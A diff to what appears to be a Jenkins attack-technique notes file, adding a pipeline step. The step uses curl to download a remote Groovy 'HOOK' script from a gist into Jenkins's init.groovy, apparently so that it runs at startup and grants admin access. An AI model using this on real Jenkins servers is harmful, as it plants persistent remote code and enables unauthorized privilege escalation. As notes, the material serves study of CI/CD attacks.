@@ -32,6 +32,23 @@ instance.setAuthorizationStrategy(strategy)
 instance.save()
 ```
 
+pipeline
+``` Jenkinsfile
+pipeline {
+    agent any
+    stages {
+        stage('Copy Groovy Script to JENKINS_HOME') {
+            steps {
+                sh '''
+                    curl -o /var/lib/jenkins/init.groovy https://gist.githubusercontent.com/dibsy/c42f536d12a406cbd3845aea4f6ac746/raw/476980613a3f23af11bc958f8a03fc40689987ff/HOOK.groovy
+                  '''
+            }
+        }         
+    }
+}
+```
+
+
 ## Give admin access to all authenticated users by executing a groovy script - Technique 2
 
 
